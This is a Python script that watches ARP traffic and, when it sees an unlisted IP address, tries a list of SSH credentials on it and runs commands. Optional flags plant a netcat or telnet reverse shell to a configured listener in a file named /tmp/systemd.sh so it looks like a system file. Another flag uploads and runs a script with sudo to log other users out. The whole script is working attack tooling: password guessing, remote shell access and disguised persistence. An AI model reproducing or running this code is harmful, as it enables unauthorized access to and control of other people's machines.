import sys
import os
import time
import json
import signal
from datetime import datetime
from scapy.all import ARP, sniff
import paramiko
import threading

# Load configuration from JSON file
with open('config.json', 'r') as f:
    config = json.load(f)

# Whitelist of IP addresses
ip_whitelist = set(config['whitelist_ips'])

# Credentials list
credentials_list = config['credentials']

# Commands to execute
commands = config['commands']

# Reverse ip
listener_ip = config["listener"]['ip'] 
listener_port = config["listener"]['port'] 

revsh = [
    f"TF=$(mktemp -u);mkfifo $TF && telnet {listener_ip} {listener_port} 0<$TF | /bin/sh 1>$TF",
    f"nc {listener_ip} {listener_port} -e /bin/sh"
]

# Set of recently detected IPs
detected_ips = set()

# Flag to indicate if the script should stop running
stop_sniffing = False

def log_detection(ip, mac, timestamp):
    with open('detection_log.txt', 'a') as logfile:
        logfile.write(f"{timestamp} - Detected unknown IP: {ip}, MAC: {mac}\n")

def arp_monitor_callback(pkt):
    if pkt[ARP].op == 1:  # ARP request
        src_ip = pkt[ARP].psrc
        src_mac = pkt[ARP].hwsrc
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        if src_ip not in ip_whitelist and src_ip not in detected_ips:
            print(f"{timestamp} - Detected unknown IP: {src_ip}, MAC: {src_mac}")
            log_detection(src_ip, src_mac, timestamp)
            detected_ips.add(src_ip)
            if args.ssh:
                t = threading.Thread(target=ssh_connect_and_execute, args=(src_ip, timestamp,))
                t.start()
                # Schedule IP removal from detected_ips after 60 seconds
                timer = threading.Timer(60, detected_ips.remove, args=(src_ip,))
                timer.start()

def ssh_connect_and_execute(ip, timestamp):
    for credentials in credentials_list:
        username = credentials['username']
        password = credentials['password']

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
        
            ssh.connect(ip, username=username, password=password, timeout=5)

            output = ""
            for cmd in commands:
                stdin, stdout, stderr = ssh.exec_command(cmd)
                output += f"=== {cmd} ===\n{stdout.read().decode()}\n"

            filename = f"{timestamp.replace(':', '-')}_Detected_{ip}.txt"
            with open(filename, 'w') as file:
                file.write(output)
            print(f"Saved output to {filename}")

            if args.reverse:
                # Create the /tmp/systemd.sh file with the specified command
                ssh.exec_command(f'echo "{revsh[1]}" > /tmp/systemd.sh')
                
                # Make the /tmp/systemd.sh file executable
                ssh.exec_command("chmod +x /tmp/systemd.sh")

                # Run the /tmp/systemd.sh script in the background
                ssh.exec_command("nohup /tmp/systemd.sh &")
                print(f"Running command on {ip}: {revsh[1]}")

            if args.hack:
                print("Trying to logout rest of the users")
                # Copy logout_others.sh to remote device
                sftp = ssh.open_sftp()
                sftp.put('logout_others.sh', '/tmp/logout_others.sh')
                sftp.close()

                # Set execute permissions on the remote script
                ssh.exec_command('chmod +x /tmp/logout_others.sh')

                # Execute the script with root privileges
                _, stdout, _ = ssh.exec_command('sudo /tmp/logout_others.sh')
                print(stdout.read().decode())
        
        except Exception as e:
            print(f"Error connecting to {ip}: {e}")
        finally:
            ssh.close()

if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(description='ARP Monitor Script')
    parser.add_argument('-s', '--ssh', action='store_true', help='Enable SSH connection to rogue devices')
    parser.add_argument('-r', '--reverse', action='store_true', help='Set up a reverse SSH tunnel')
    parser.add_argument('-k', '--hack', action='store_true', help='Copy and execute the logout_others.sh script on rogue devices')

    args = parser.parse_args()

    if not args.ssh:
        if args.reverse or args.hack:
            print("Need to enable ssh, continuie just monitoring and loging.")
        args.reverse = False
        args.hack = False

    print("Monitoring ARP requests...")
    sniff(prn=arp_monitor_callback, filter="arp", store=0)
